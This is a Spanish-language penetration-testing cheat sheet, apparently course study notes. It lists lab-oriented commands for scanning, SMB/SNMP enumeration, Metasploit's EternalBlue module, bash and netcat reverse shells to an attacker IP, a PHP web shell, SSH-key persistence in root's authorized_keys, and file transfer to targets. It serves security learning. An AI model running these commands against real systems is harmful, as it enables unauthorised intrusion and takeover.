---
{"-publish":true,"permalink":"/hacking/basico/basic-tools/","PassFrontmatter":true}
---


## Basic Tools

| **Command**              | **Description**                                |     |
| ------------------------ | ---------------------------------------------- | --- |
| **General**              |                                                |     |
| `sudo openvpn user.ovpn` | Conecta a la VPN                               |     |
| `ifconfig`/`ip a`        | Te muestra tu dirección IP                     |     |
| `netstat -rn`            | Te muestra redes accesibles a través de la VPN |     |
| `ssh user@10.10.10.10`   | Conexión remota a SSH                          |     |
| `ftp 10.129.42.253`      | Conexión remota a FTP                          |     |
| **tmux**                 |                                                |     |
| `tmux`                   | Inicia tmux                                    |     |
| `ctrl+b`                 | tmux: default prefix                           |     |
| `prefix c`               | tmux: nueva ventana                            |     |
| `prefix 1`               | tmux: cambia de ventana (`1`)                  |     |
| `prefix shift+%`         | tmux: divide el panel verticalmente            |     |
| `prefix shift+"`         | tmux: divide el panel horizontalmente          |     |
| `prefix ->`              | tmux: cambia al panel derecho                  |     |
| **Vim**                  |                                                |     |
| `vim file`               | vim: abre un `file` con VIM                    |     |
| `esc+i`                  | vim: entra en modo `insert`                    |     |
| `esc`                    | vim: vuelve a mode `normal`                    |     |
| `x`                      | vim: corta caracteres                          |     |
| `dw`                     | vim: corta palabras                            |     |
| `dd`                     | vim: corta lineas enteras                      |     |
| `yw`                     | vim: copia palabras                            |     |
| `yy`                     | vim: copia lineas enteras                      |     |
| `p`                      | vim: pega                                      |     |
| `:1`                     | vim: Va hacia la linea 1.                      |     |
| `:w`                     | vim: Escribe el archivo 'i.e. save'            |     |
| `:q`                     | vim: Cierra el VIM                             |     |
| `:q!`                    | vim: Cierra sin guardar                        |     |
| `:wq`                    | vim: Cierra guardando                          |     |

## Pentesting

| **Command**                                                                           | **Description**                                                                     |
| ------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| **Service Scanning**                                                                  |                                                                                     |
| `nmap 10.129.42.253`                                                                  | Corre NMAP en la IP                                                                 |
| `nmap -sV -sC -p- 10.129.42.253`                                                      | Corre NMAP con escaneo de scripts y servicios en la IP hacia todos los puertos      |
| `locate scripts/citrix`                                                               | Lista varias NMAP scripts disponibles                                               |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40`                                | Corre un NMAP script en la IP con puerto 445                                        |
| `netcat 10.10.10.10 22`                                                               | Grab banner of an open port                                                         |
| `smbclient -N -L \\\\10.129.42.253`                                                   | Lista SMB compartidas                                                               |
| `smbclient \\\\10.129.42.253\\users`                                                  | Conecta a un SMB compartido                                                         |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`                            | Escanea SNMP en una IP                                                              |
| `onesixtyone -c dict.txt 10.129.42.254`                                               | Fuerza Bruta SNMP Secret String                                                     |
| **Web Enumeration**                                                                   |                                                                                     |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`        | Ejecute un escaneo de directorio en un sitio web                                    |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Ejecute un escaneo de subdominio en un sitio web                                    |
| `curl -IL https://www.inlanefreight.com`                                              | Banner del sitio web                                                                |
| `whatweb 10.10.10.121`                                                                | Lista de detalles sobre el servidor web/certificados                                |
| `curl 10.10.10.121/robots.txt`                                                        | Lista de directorios potenciales en `robots.txt`                                    |
| `ctrl+U`                                                                              | Ver fuente de página (en Firefox)                                                   |
| **Public Exploits**                                                                   |                                                                                     |
| `searchsploit openssh 7.2`                                                            | Buscar hazañas públicas para una aplicación web                                     |
| `msfconsole`                                                                          | MSF: inicie el marco de MetaSploit                                                  |
| `search exploit eternalblue`                                                          | MSF: busque hazañas públicas en MSF                                                 |
| `use exploit/windows/smb/ms17_010_psexec`                                             | MSF: comience a usar un módulo MSF                                                  |
| `show options`                                                                        | MSF: Muestre las opciones requeridas para un módulo MSF                             |
| `set RHOSTS 10.10.10.40`                                                              | MSF: establezca un valor para una opción de módulo MSF                              |
| `check`                                                                               | MSF: prueba si el servidor de destino es vulnerable                                 |
| `exploit`                                                                             | MSF: ejecute el exploit en el servidor de destino es vulnerable                     |
| **Using Shells**                                                                      |                                                                                     |
| `nc -lvnp 1234`                                                                       | Inicie un oyente `nc` en un puerto local                                            |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`                                 | Envíe un reverse shell desde el servidor remoto                                     |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f`    | Otro comando para enviar una reverse shell desde el servidor remoto                 |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`         | Inicia un bind shell en el servidor remoto                                          |
| `nc 10.10.10.1 1234`                                                                  | Conecta a un bind shell iniciado en el servidor remoto                              |
| `python -c 'import pty; pty.spawn("/bin/bash")'`                                      | Actualizar shell tty (1)                                                            |
| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice                           | Actualizar shell tty (2)                                                            |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`                     | Crear un archivo PHP de WebShell                                                    |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id`                                         | Ejecutar un comando en una red web cargada                                          |
| **Privilege Escalation**                                                              |                                                                                     |
| `./linpeas.sh`                                                                        | Ejecutar el script `LinPeas` para enumerar el servidor remoto                       |
| `sudo -l`                                                                             | Lista disponible para `sudo` privileges                                             |
| `sudo -u user /bin/echo Hello World!`                                                 | Ejecute un comando con `sudo`                                                       |
| `sudo su -`                                                                           | Cambiar al usuario root (si tenemos acceso a `sudo su`)                             |
| `sudo su user -`                                                                      | Cambie a un usuario (si tenemos acceso a `sudo su`)                                 |
| `ssh-keygen -f key`                                                                   | Crea una nueva llave `SSH`                                                          |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`          | Agregue la clave pública generada al usuario                                        |
| `ssh root@10.10.10.10 -i key`                                                         | `SSH` al servidor con la clave privada generada                                     |
| **Transferring Files**                                                                |                                                                                     |
| `python3 -m http.server 8000`                                                         | Inicia un servidor web local                                                        |
| `wget http://10.10.14.1:8000/linpeas.sh`                                              | Descarga un archivo en el servidor remoto desde nuestra `máquina local`             |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`                                | Descarga un archivo en el servidor remoto desde nuestra `máquina local`             |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh`                                      | Transfiera un archivo al servidor remoto con `SCP` (requiere acceso `SSH`)          |
| `base64 shell -w 0`                                                                   | Convertir un archivo a `base64`                                                     |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell`                                     | Convertir un archivo de `base64` de regreso a su origen                             |
| `md5sum shell`                                                                        | Verifique el `md5sum` del archivo para asegurarse de que se convierta correctamente |
